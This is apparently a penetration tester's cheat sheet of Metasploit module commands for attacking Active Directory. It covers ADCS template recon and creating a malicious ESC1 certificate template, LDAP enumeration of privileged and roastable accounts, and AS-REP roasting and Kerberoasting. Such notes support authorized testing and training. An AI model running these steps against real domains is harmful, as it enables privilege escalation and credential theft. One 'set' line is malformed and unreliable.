# Metasploit - AD Enumeration

### 1) ADCS Template Recon

    use auxiliary/admin/ldap/ad_cs_cert_template

Execution

    set LDAPDOMAIN domain.local
    set LDAPUSERNAME user
    set LDAPPASSWORD password
    set RHOSTS IP
    run

Exploitation example

#### Create a malicious ESC1 certificate template

    set LDAPUSERNAME administrator
    set cert_template_esc1.metasploit
    set TEMPLATE_FILE /usr/share/metasploit-framework/data/auxiliary/admin/ldap/ad_cs_cert_template/esc1_template.yaml
    set ACTION create
    run

### 2) LDAP Account and Object recon

    use auxiliary/gather/ldap_query

Execution

    set LDAPDOMAIN domain.local
    set LDAPUSERNAME user
    set LDAPPASSWORD password
    set ACTION ENUM_ACCOUNTS
    run

#### Enumerate Privileged Admin Objects

    set ACTION ENUM_ADMIN_OBJECTS
    run

#### Discover ADCS Certificate authorities

    set ACTION ENUM_AD_CS_CAS
    run

#### List ADCS Certificate Templates

    set ACTION ENUM_AD_CS_CERT_TEMPLATES
    run

#### Enumerate Domain-Joined Computers

    set ACTION ENUM_COMPUTERS
    run

#### Enumerate Domain Policy Information

    set ACTION ENUM_DOMAIN
    run

#### Identify Domain Controller

    set ACTION ENUM_DC
    run

#### Enumerate Domain Groups

    set ACTION ENUM_GROUPS
    run

#### Read the Machine Account Quota

    set ACTION ENUM_MACHINE_ACCOUNT_QUOTA
    run

#### Identify AS-REP Roastable accounts

    set ACTION ENUM_USER_ASREP_ROASTABLE
    run

#### Identify Kerberoastable accounts

    set ACTION ENUM_USER_SPNS_KERBEROAST
    run

### 3) Kerberos Attacks (Combined with above Kerberos-related content)

#### AS-REP Roasting

    use auxiliary/gather/asrep

Execution

    set domain domain.local
    set rhosts IP
    set username ASREPROASTABLE_USER
    run

#### Kerberoasting

    use auxiliary/gather/get_user_spns

Execution

    set user user
    set pass password
    set domain domain.local
    set rhosts IP
    run

